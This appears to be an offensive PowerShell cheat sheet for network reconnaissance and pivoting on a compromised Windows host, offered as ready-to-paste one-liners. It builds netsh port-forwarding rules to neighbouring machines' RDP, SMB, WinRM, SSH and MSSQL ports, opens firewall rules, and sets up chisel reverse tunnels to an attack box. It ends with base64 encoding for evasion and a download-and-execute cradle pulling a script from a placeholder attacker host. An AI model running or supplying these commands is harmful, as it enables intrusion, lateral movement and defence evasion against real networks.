# ===========================================
# PIVOT RECON ONE-LINER (Copy this entire block)
# ===========================================

$b={param($t)Write-Host "`n$("="*60)`n $t`n$("="*60)" -F Cyan};$s={param($t)Write-Host "`n[+] $t" -F Green};$c={param($t)Write-Host "    $t" -F Yellow};$ifs=Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress-ne"127.0.0.1"};$ips=$ifs|%{$_.IPAddress};$tgts=Get-NetNeighbor -State Reachable,Stale|?{$_.IPAddress-match"^\d+\.\d+\.\d+\.\d+$"-and$_.IPAddress-notin$ips}|select -Expand IPAddress -First 5;&$b "NETWORK RECON";&$s "INTERFACES";$ifs|%{Write-Host "    $($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength)"};&$s "ARP CACHE";Get-NetNeighbor -State Reachable,Stale|?{$_.IPAddress-notmatch"^(ff|fe80)"}|%{Write-Host "    $($_.IPAddress) - $($_.LinkLayerAddress)"};&$s "ROUTES";Get-NetRoute|?{$_.NextHop-ne"0.0.0.0"-and$_.DestinationPrefix-notmatch"^(ff|255|224)"}|select DestinationPrefix,NextHop -First 10|%{Write-Host "    $($_.DestinationPrefix) -> $($_.NextHop)"};&$s "LISTENING";Get-NetTCPConnection -State Listen|?{$_.LocalAddress-ne"127.0.0.1"}|select LocalAddress,LocalPort -Unique|%{Write-Host "    $($_.LocalAddress):$($_.LocalPort)"};&$b "NETSH PIVOTS";&$s "RDP (3389)";$tgts|%{$t=$_;$ips|%{&$c "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=$_ connectport=3389 connectaddress=$t"}};&$s "SMB (445)";$tgts|%{$t=$_;$ips|%{&$c "netsh interface portproxy add v4tov4 listenport=8445 listenaddress=$_ connectport=445 connectaddress=$t"}};&$s "WINRM (5985)";$tgts|%{$t=$_;$ips|%{&$c "netsh interface portproxy add v4tov4 listenport=5986 listenaddress=$_ connectport=5985 connectaddress=$t"}};&$s "HTTP (80)";$tgts|%{$t=$_;$ips|%{&$c "netsh interface portproxy add v4tov4 listenport=8888 listenaddress=$_ connectport=80 connectaddress=$t"}};&$s "SSH (22)";$tgts|%{$t=$_;$ips|%{&$c "netsh interface portproxy add v4tov4 listenport=2222 listenaddress=$_ connectport=22 connectaddress=$t"}};&$s "MSSQL (1433)";$tgts|%{$t=$_;$ips|%{&$c "netsh interface portproxy add v4tov4 listenport=1434 listenaddress=$_ connectport=1433 connectaddress=$t"}};&$s "MGMT";&$c "netsh interface portproxy show v4tov4";&$c "netsh interface portproxy reset";&$b "FIREWALL";@(8080,8445,5986,8888,2222)|%{&$c "netsh advfirewall firewall add rule name=Pivot$_ dir=in action=allow protocol=tcp localport=$_"};&$b "CHISEL";&$c "chisel client ATTACKBOX:8000 R:8080:TARGET:3389";&$c "chisel client ATTACKBOX:8000 R:socks";&$b "CONNECT FROM ATTACK BOX";$ips|%{&$c "xfreerdp /v:$($_):8080 /u:USER /p:PASS"}

# ===========================================
# SUPER COMPACT ONE-LINER (Single line - Just copy and run)
# ===========================================

# Paste this directly into PowerShell:

$b={param($t)Write-Host "`n$("="*60)`n $t`n$("="*60)" -F Cyan};$s={param($t)Write-Host "`n[+] $t" -F Green};$c={param($t)Write-Host "    $t" -F Yellow};$ifs=Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress-ne"127.0.0.1"};$ips=$ifs|%{$_.IPAddress};$tgts=Get-NetNeighbor -State Reachable,Stale|?{$_.IPAddress-match"^\d+\.\d+\.\d+\.\d+$"-and$_.IPAddress-notin$ips}|select -Expand IPAddress -First 5;&$b "RECON";&$s "IPs";$ifs|%{Write-Host "    $($_.InterfaceAlias): $($_.IPAddress)"};&$s "ARP";Get-NetNeighbor -State Reachable,Stale|?{$_.IPAddress-notmatch"^(ff|fe80)"}|%{Write-Host "    $($_.IPAddress)"};&$s "ROUTES";Get-NetRoute|?{$_.NextHop-ne"0.0.0.0"-and$_.DestinationPrefix-notmatch"^(ff|255|224)"}|select -First 5|%{Write-Host "    $($_.DestinationPrefix)"};&$b "PIVOTS";&$s "RDP";$tgts|%{$t=$_;$ips|%{&$c "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=$_ connectport=3389 connectaddress=$t"}};&$s "SMB";$tgts|%{$t=$_;$ips|%{&$c "netsh interface portproxy add v4tov4 listenport=8445 listenaddress=$_ connectport=445 connectaddress=$t"}};&$s "WINRM";$tgts|%{$t=$_;$ips|%{&$c "netsh interface portproxy add v4tov4 listenport=5986 listenaddress=$_ connectport=5985 connectaddress=$t"}};&$s "MGMT";&$c "netsh interface portproxy show v4tov4";&$c "netsh interface portproxy reset"


# ===========================================
# MINIMAL RECON ONLY (Just network info, no pivot commands)
# ===========================================

Write-Host "=== IPs ===" -F Cyan;Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress-ne"127.0.0.1"}|%{Write-Host "$($_.InterfaceAlias): $($_.IPAddress)"};Write-Host "`n=== ARP ===" -F Cyan;Get-NetNeighbor -State Reachable,Stale|?{$_.IPAddress-match"^\d+\.\d+"}|%{Write-Host "$($_.IPAddress) - $($_.LinkLayerAddress)"};Write-Host "`n=== ROUTES ===" -F Cyan;Get-NetRoute|?{$_.NextHop-ne"0.0.0.0"}|select DestinationPrefix,NextHop -First 10|ft;Write-Host "`n=== LISTENING ===" -F Cyan;Get-NetTCPConnection -State Listen|?{$_.LocalAddress-ne"127.0.0.1"}|select LocalAddress,LocalPort -Unique|ft


# ===========================================
# BASE64 ENCODED VERSION (For bypasses/obfuscation)
# ===========================================

# Generate base64:
# $cmd = 'YOUR_ONELINER_HERE'
# [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))

# Execute:
# powershell -enc BASE64_STRING_HERE


# ===========================================
# IEX FROM REMOTE (Host the full script)
# ===========================================

# On your attack box:
# python3 -m http.server 80

# On target:
# IEX(New-Object Net.WebClient).DownloadString('http://ATTACKBOX_IP/pivot-recon.ps1')

# Or with bypass:
# powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKBOX_IP/pivot-recon.ps1')"
